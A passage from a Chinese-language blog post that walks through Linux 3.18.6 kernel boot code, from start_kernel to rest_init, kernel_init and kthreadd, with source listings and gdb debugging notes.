it\n&quot;</span>))</span><br><span class="line">local_irq_disable();</span><br><span class="line">idr_init_cache();</span><br><span class="line">rcu_init();</span><br><span class="line">context_tracking_init();</span><br><span class="line">radix_tree_init();</span><br><span class="line"><span class="comment">/* init some links before init_ISA_irqs() */</span></span><br><span class="line">early_irq_init();</span><br><span class="line">init_IRQ();</span><br><span class="line">tick_init();</span><br><span class="line">rcu_init_nohz();</span><br><span class="line">init_timers();</span><br><span class="line">hrtimers_init();</span><br><span class="line">softirq_init();</span><br><span class="line">timekeeping_init();</span><br><span class="line">time_init();</span><br><span class="line">sched_clock_postinit();</span><br><span class="line">perf_event_init();</span><br><span class="line">profile_init();</span><br><span class="line">call_function_init();</span><br><span class="line">WARN(!irqs_disabled(), <span class="string">&quot;Interrupts were enabled early\n&quot;</span>);</span><br><span class="line">early_boot_irqs_disabled = <span class="literal">false</span>;</span><br><span class="line">local_irq_enable();</span><br><span class="line"></span><br><span class="line">kmem_cache_init_late();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * HACK ALERT! This is early. We&#x27;re enabling the console before</span></span><br><span class="line"><span class="comment"> * we&#x27;ve done PCI setups etc, and console_init() must be aware of</span></span><br><span class="line"><span class="comment"> * this. But we do want output early, in case something goes wrong.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">console_init();</span><br><span class="line"><span class="keyword">if</span> (panic_later)</span><br><span class="line">panic(<span class="string">&quot;Too many boot %s vars at `%s&#x27;&quot;</span>, panic_later,</span><br><span class="line">      panic_param);</span><br><span class="line"></span><br><span class="line">lockdep_info();</span><br><span class="line"></span><br><span class="line">locking_selftest();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BLK_DEV_INITRD</span></span><br><span class="line"><span class="keyword">if</span> (initrd_start &amp;&amp; !initrd_below_start_ok &amp;&amp;</span><br><span class="line">    page_to_pfn(virt_to_page((<span class="keyword">void</span> *)initrd_start)) &lt; min_low_pfn) &#123;</span><br><span class="line">pr_crit(<span class="string">&quot;initrd overwritten (0x%08lx &lt; 0x%08lx) - disabling it.\n&quot;</span>,</span><br><span class="line">    page_to_pfn(virt_to_page((<span class="keyword">void</span> *)initrd_start)),</span><br><span class="line">    min_low_pfn);</span><br><span class="line">initrd_start = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">page_cgroup_init();</span><br><span class="line">debug_objects_mem_init();</span><br><span class="line">kmemleak_init();</span><br><span class="line">setup_per_cpu_pageset();</span><br><span class="line">numa_policy_init();</span><br><span class="line"><span class="keyword">if</span> (late_time_init)</span><br><span class="line">late_time_init();</span><br><span class="line">sched_clock_init();</span><br><span class="line">calibrate_delay();</span><br><span class="line">pidmap_init();</span><br><span class="line">anon_vma_init();</span><br><span class="line">acpi_early_init();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86</span></span><br><span class="line"><span class="keyword">if</span> (efi_enabled(EFI_RUNTIME_SERVICES))</span><br><span class="line">efi_enter_virtual_mode();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_ESPFIX64</span></span><br><span class="line"><span class="comment">/* Should be run before the first non-init thread is created */</span></span><br><span class="line">init_espfix_bsp();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">thread_info_cache_init();</span><br><span class="line">cred_init();</span><br><span class="line">fork_init(totalram_pages);</span><br><span class="line">proc_caches_init();</span><br><span class="line">buffer_init();</span><br><span class="line">key_init();</span><br><span class="line">security_init();</span><br><span class="line">dbg_late_init();</span><br><span class="line">vfs_caches_init(totalram_pages);</span><br><span class="line">signals_init();</span><br><span class="line"><span class="comment">/* rootfs populating might need page-writeback */</span></span><br><span class="line">page_writeback_init();</span><br><span class="line">proc_root_init();</span><br><span class="line">cgroup_init();</span><br><span class="line">cpuset_init();</span><br><span class="line">taskstats_init_early();</span><br><span class="line">delayacct_init();</span><br><span class="line"></span><br><span class="line">check_bugs();</span><br><span class="line"></span><br><span class="line">sfi_init_late();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (efi_enabled(EFI_RUNTIME_SERVICES)) &#123;</span><br><span class="line">efi_late_init();</span><br><span class="line">efi_free_boot_services();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ftrace_init();</span><br><span class="line"><span class="comment">/* Do the rest non-__init&#x27;ed, we&#x27;re now alive */</span></span><br><span class="line">rest_init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>start_kernel</code>处下断点之后<code>c</code>就断下来了，可以从<code>pwngdb</code>里面看到此时的堆栈已经初始化好了，这里应该是进程内核栈：</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/5.jpg" class=""><h4 id="init-task"><a href="#init-task" class="headerlink" title="init_task"></a>init_task</h4><p>最最最开始的部分就是下面这个部分，当我进入的时候<code>lockdep_init()</code>已经完成了，我不信邪，重新开始想要再它那下断点，发现它并没有<code>lockdep_init</code>这个符号：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lockdep_init();</span><br><span class="line">set_task_stack_end_magic(&amp;init_task);</span><br></pre></td></tr></table></figure><p>简单看一下它的源码，首先检查<code>lockdep_init</code>是否被初始化过（它只需要初始化一次），之后就是生成了两个哈希的链表，插入自己的一个想法：如果它没有检查<code>lockdep_init</code>是否被初始化，是不是可以再一次进行初始化然后控制我们的这个链表上内容进行一下伪造呢？（突发奇想，大师傅莫怪），关于死锁检测的原理看下面的文章：</p><p><a href="https://blog.csdn.net/faxiang1230/article/details/105223966/">死锁检测lockdep实现原理</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lockdep_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lockdep_initialized)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CLASSHASH_SIZE; i++)</span><br><span class="line">    INIT_LIST_HEAD(classhash_table + i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CHAINHASH_SIZE; i++)</span><br><span class="line">    INIT_LIST_HEAD(chainhash_table + i);</span><br><span class="line"></span><br><span class="line">    lockdep_initialized = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在源码中会有<code>Need to run as early as possible, to initialize the lockdep hash</code>这条注释，翻译过来就是说<code>lockdep_init</code>需要尽可能的最早运行，为什么呢？其实往下看下一条指令（<code>set_task_stack_end_magic(&amp;init_task)</code>）就知道了，步入之后它就去<code>fork.c</code>了，但此进程并不是<code>fork</code>出来的，回过头看它初始化死锁也是挺有道理的，回头想想这岂不是第一个进程？答案确实是的！</p><blockquote><p>可以看出<code> init_task</code>（0 号进程）是<code>task_struct</code>类型，是进程描述符， 使用宏 INIT_TASK 对其进行初始化。</p></blockquote><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/6.png" class="" width="6"><p>刚开始看看它的源码也是挺奇怪的，它的目的是防止溢出？它在<code>stack</code>的末尾放了一个<code>STACK_END_MAGIC</code>的标志，栈溢出不是有<code>canary</code>来保护吗，为什么要两个玩意儿来保护，其实这两个有着本质的区别，<code>canary</code>是保护返回地址不被覆盖，而此处的<code>STACK_END_MAGIC</code>是保护栈的底部，防止有些恶意的数据向内存中的其他地方蔓延，此处也证明了它再进入<code>start_kernel</code>的时候已经初始化好了栈：</p><p><a href="https://blog.csdn.net/qq_41957544/article/details/117965729">start_kernel 分析 —— set_task_stack_end_magic</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_END_MAGIC0x57AC6E9D</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_task_stack_end_magic</span><span class="params">(struct task_struct *tsk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *stackend;</span><br><span class="line">    </span><br><span class="line">    stackend = end_of_stack(tsk);</span><br><span class="line">    *stackend = STACK_END_MAGIC;<span class="comment">/* for overflow detection */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="boot-init-stack-canary"><a href="#boot-init-stack-canary" class="headerlink" title="boot_init_stack_canary"></a>boot_init_stack_canary</h4><p>下面才是<code>canary</code>的初始化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boot_init_stack_canary();</span><br></pre></td></tr></table></figure><p>熟悉<code>PWN</code>的选手对于<code>canary</code>可能都不会太陌生，这里就稍微介绍一下，利用<code>random+tsc</code>的模式来生成随机数，为啥要用两个来生成呢？答案很明显就是增加随机性嘛！然后写入到<code>idle</code>进程的<code>task_struct-&gt;stack_canary</code>中里面（这个是啥等会再说），同时还得写到<code>CPU</code>里面去：</p><p><a href="https://blog.csdn.net/sahusoft/article/details/7866536">时间戳计数器 TSC</a></p><p><a href="https://www.cnblogs.com/bigship/archive/2010/04/04/1704228.html">从Linux内核中获取真随机数</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">boot_init_stack_canary</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    u64 canary;</span><br><span class="line">    u64 tsc;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">    BUILD_BUG_ON(offsetof(<span class="keyword">union</span> irq_stack_union, stack_canary) != <span class="number">40</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    get_random_bytes(&amp;canary, <span class="keyword">sizeof</span>(canary));</span><br><span class="line">    tsc = __native_read_tsc();</span><br><span class="line">    canary += tsc + (tsc &lt;&lt; <span class="number">32UL</span>);</span><br><span class="line"></span><br><span class="line">    current-&gt;stack_canary = canary;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">    this_cpu_write(irq_stack_union.stack_canary, canary);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    this_cpu_write(stack_canary.canary, canary);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="cgroup-init-early"><a href="#cgroup-init-early" class="headerlink" title="cgroup_init_early"></a>cgroup_init_early</h4><p><code>cgroup</code>为进程的行为控制，<code>cgroup_init_early</code>做数据结构和其中链表的初始化，有个博主写的够详细了：</p><p><a href="https://blog.csdn.net/u011370207/article/details/80236674">从cgroup_init_early函数学习cgroup——初始化代码</a></p><p><a href="https://blog.csdn.net/u011370207/article/details/80235698">从cgroup_init_early函数学习cgroup——框架</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cgroup_init_early();</span><br></pre></td></tr></table></figure><p>在后面的初始<code>CPU</code>的过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">local_irq_disable();</span><br><span class="line">local_irq_enable();</span><br></pre></td></tr></table></figure><h4 id="boot-cpu-init"><a href="#boot-cpu-init" class="headerlink" title="boot_cpu_init"></a>boot_cpu_init</h4><p><code>boot_cpu_init</code>是去启动<code>boot CPU</code>的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __init <span class="title">boot_cpu_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cpu = smp_processor_id();</span><br><span class="line">    <span class="comment">/* Mark the boot cpu &quot;present&quot;, &quot;online&quot; etc for SMP and UP case */</span></span><br><span class="line">    set_cpu_online(cpu, <span class="literal">true</span>);</span><br><span class="line">    set_cpu_active(cpu, <span class="literal">true</span>);</span><br><span class="line">    set_cpu_present(cpu, <span class="literal">true</span>);</span><br><span class="line">    set_cpu_possible(cpu, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="trap-init"><a href="#trap-init" class="headerlink" title="trap_init"></a>trap_init</h4><p>初始化中断向量表也是很重要的一个函数，毕竟中断是计算机当中的三大法宝之一😁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trap_init();</span><br></pre></td></tr></table></figure><p>下面是它的源码，看着挺长但总共也就四个函数分别是<code>set_trap_gate</code>，<code>set_system_gate</code>，<code>c</code>，<code>outb</code></p><ul><li>set_trap_gate</li></ul><p>这个很好理解，就是设置中断向量表，看的到0号中断，1号中断…，这些在学习汇编的时候都有涉及到</p><p><a href="https://wenku.baidu.com/view/bba59d5dbe23482fb4da4c81.html">Linux0.11版本的set_trap_gate宏分析</a></p><ul><li>set_system_gate</li></ul><p>设置系统的中断向量表，和上面的一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trap_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="comment">//设置系统的硬件中断 中断位于kernel/asm.s 或 system_call.s</span></span><br><span class="line">set_trap_gate(<span class="number">0</span>,÷_error);<span class="comment">//0中断，位于/kernel/asm.s 19行</span></span><br><span class="line">set_trap_gate(<span class="number">1</span>,&amp;debug);</span><br><span class="line">set_trap_gate(<span class="number">2</span>,&amp;nmi);</span><br><span class="line">set_system_gate(<span class="number">3</span>,&amp;int3);<span class="comment">/* int3-5 can be called from all */</span></span><br><span class="line">set_system_gate(<span class="number">4</span>,&amp;overflow);</span><br><span class="line">set_system_gate(<span class="number">5</span>,&amp;bounds);</span><br><span class="line">set_trap_gate(<span class="number">6</span>,&amp;invalid_op);</span><br><span class="line">set_trap_gate(<span class="number">7</span>,&amp;device_not_available);</span><br><span class="line">set_trap_gate(<span class="number">8</span>,&amp;double_fault);</span><br><span class="line">set_trap_gate(<span class="number">9</span>,&amp;coprocessor_segment_overrun);</span><br><span class="line">set_trap_gate(<span class="number">10</span>,&amp;invalid_TSS);</span><br><span class="line">set_trap_gate(<span class="number">11</span>,&amp;segment_not_present);</span><br><span class="line">set_trap_gate(<span class="number">12</span>,&amp;stack_segment);</span><br><span class="line">set_trap_gate(<span class="number">13</span>,&amp;general_protection);</span><br><span class="line">set_trap_gate(<span class="number">14</span>,&amp;page_fault);</span><br><span class="line">set_trap_gate(<span class="number">15</span>,&amp;reserved);</span><br><span class="line">set_trap_gate(<span class="number">16</span>,&amp;coprocessor_error);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">17</span>;i&lt;<span class="number">48</span>;i++)</span><br><span class="line">set_trap_gate(i,&amp;reserved);</span><br><span class="line">set_trap_gate(<span class="number">45</span>,&amp;irq13);</span><br><span class="line">outb_p(inb_p(<span class="number">0x21</span>)&amp;<span class="number">0xfb</span>,<span class="number">0x21</span>);<span class="comment">//设置CPU电平</span></span><br><span class="line">outb(inb_p(<span class="number">0xA1</span>)&amp;<span class="number">0xdf</span>,<span class="number">0xA1</span>);</span><br><span class="line">set_trap_gate(<span class="number">39</span>,&amp;parallel_interrupt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="rest-init"><a href="#rest-init" class="headerlink" title="rest_init"></a>rest_init</h4><p>完成之前的初始之后就进入了一个很关键的函数<code>rest_init();</code>，此函数在<code>linux-3.18.6/init/main.c</code>，下面就是它的源码，此函数完成以后，内核的初始化工作就已经全部完成，接下来看看它到底做了什么工作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">void</span> __init_refok <span class="title">rest_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> pid;</span><br><span class="line"></span><br><span class="line">rcu_scheduler_starting();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We need to spawn init first so that it obtains pid 1, however</span></span><br><span class="line"><span class="comment"> * the init task will end up wanting to create kthreads, which, if</span></span><br><span class="line"><span class="comment"> * we schedule it before we create kthreadd, will OOPS.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">kernel_thread(kernel_init, <span class="literal">NULL</span>, CLONE_FS);</span><br><span class="line">numa_default_policy();</span><br><span class="line">pid = kernel_thread(kthreadd, <span class="literal">NULL</span>, CLONE_FS | CLONE_FILES);</span><br><span class="line">rcu_read_lock();</span><br><span class="line">kthreadd_task = find_task_by_pid_ns(pid, &amp;init_pid_ns);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">complete(&amp;kthreadd_done);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The boot idle thread must execute schedule()</span></span><br><span class="line"><span class="comment"> * at least once to get things moving:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">init_idle_bootup_task(current);</span><br><span class="line">schedule_preempt_disabled();</span><br><span class="line"><span class="comment">/* Call into cpu_idle with preempt disabled */</span></span><br><span class="line">cpu_startup_entry(CPUHP_ONLINE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此函数之所以重要，是因为它创建了两个线程，分别是<code>kernel_init</code>和<code>kthreadd</code>，也就是说从开始的<code>init_task</code>之后又创建了两个线程，终于碰到了开头说到的1号进程和2号进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kernel_thread(kernel_init, <span class="literal">NULL</span>, CLONE_FS);</span><br><span class="line">pid = kernel_thread(kthreadd, <span class="literal">NULL</span>, CLONE_FS | CLONE_FILES);</span><br></pre></td></tr></table></figure><p><code>kernel_thread</code>是通过<code>do_fork</code>来启动一个内核线程，线程的开启是根据<code>int (*fn)(void *)</code>这个函数指针来调用的，每个标志的含义见下面的链接：</p><p><a href="https://zhuanlan.zhihu.com/p/350520191">_do_fork函数源码解析</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">kernel_thread</span><span class="params">(<span class="keyword">int</span> (*fn)(<span class="keyword">void</span> *), <span class="keyword">void</span> *arg, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> do_fork(flags|CLONE_VM|CLONE_UNTRACED, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fn,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="kernel-init"><a href="#kernel-init" class="headerlink" title="kernel_init"></a>kernel_init</h5><p>现在就开始进入到<code>kernel_init</code>和<code>kthreadd</code>里面来看看它俩到底做了什么，首先是<code>kernel_init</code>，其实它还有个别名叫<code>init</code>进程，没错，它就是用户态进程的开端，所有的进程都是间接或直接由它生成的，但是之前听到的<code>init</code>进程都是再用户态程序当中的，而此处的<code>init</code>是处于内核当中的，所以此函数肯定存在从内核态转向用户态的过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __ref <span class="title">kernel_init</span><span class="params">(<span class="keyword">void</span> *unused)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">kernel_init_freeable();</span><br><span class="line"><span class="comment">/* need to finish all async __init code before freeing the memory */</span></span><br><span class="line">async_synchronize_full();</span><br><span class="line">free_initmem();</span><br><span class="line">mark_rodata_ro();</span><br><span class="line">system_state = SYSTEM_RUNNING;</span><br><span class="line">numa_default_policy();</span><br><span class="line"></span><br><span class="line">flush_delayed_fput();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ramdisk_execute_command) &#123;</span><br><span class="line">ret = run_init_process(ramdisk_execute_command);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">pr_err(<span class="string">&quot;Failed to execute %s (error %d)\n&quot;</span>,</span><br><span class="line">       ramdisk_execute_command, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We try each of these until one succeeds.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The Bourne shell can be used instead of init if we are</span></span><br><span class="line"><span class="comment"> * trying to recover a really broken machine.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (execute_command) &#123;</span><br><span class="line">ret = run_init_process(execute_command);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">pr_err(<span class="string">&quot;Failed to execute %s (error %d).  Attempting defaults...\n&quot;</span>,</span><br><span class="line">execute_command, ret);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!try_to_run_init_process(<span class="string">&quot;/sbin/init&quot;</span>) ||</span><br><span class="line">    !try_to_run_init_process(<span class="string">&quot;/etc/init&quot;</span>) ||</span><br><span class="line">    !try_to_run_init_process(<span class="string">&quot;/bin/init&quot;</span>) ||</span><br><span class="line">    !try_to_run_init_process(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">panic(<span class="string">&quot;No working init found.  Try passing init= option to kernel. &quot;</span></span><br><span class="line">      <span class="string">&quot;See Linux Documentation/init.txt for guidance.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那它是怎么转换的呢？答：直接去用户态进程找到一个<code>init</code>进程并启动它，要找到用户态进程那首先就得挂载文件系统吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ramdisk_execute_command) &#123;</span><br><span class="line">ret = run_init_process(ramdisk_execute_command);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">pr_err(<span class="string">&quot;Failed to execute %s (error %d)\n&quot;</span>,ramdisk_execute_command, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>挂载完成之后，如果在命令行中有指定<code>init</code>的程序就去执行这个，如果没有就去一些固定的目录去找：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (execute_command) &#123;</span><br><span class="line">    ret = run_init_process(execute_command);</span><br><span class="line">    <span class="keyword">if</span> (!ret)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    pr_err(<span class="string">&quot;Failed to execute %s (error %d).  Attempting defaults...\n&quot;</span>,</span><br><span class="line">           execute_command, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始寻找用户态的文件系统中的<code>init</code>进程，只要这四个只要一个就可以了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!try_to_run_init_process(<span class="string">&quot;/sbin/init&quot;</span>) ||</span><br><span class="line">    !try_to_run_init_process(<span class="string">&quot;/etc/init&quot;</span>) ||</span><br><span class="line">    !try_to_run_init_process(<span class="string">&quot;/bin/init&quot;</span>) ||</span><br><span class="line">    !try_to_run_init_process(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h5 id="kthreadd"><a href="#kthreadd" class="headerlink" title="kthreadd"></a>kthreadd</h5><p><code>kthreadd</code>的本地就是运行在内核态的死循环，它会不断遍历<code>kthread_create_list</code>来查看是否有需要创建的线程，这个进程是linux内核的守护进程，它的作用是管理调度其他内核进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 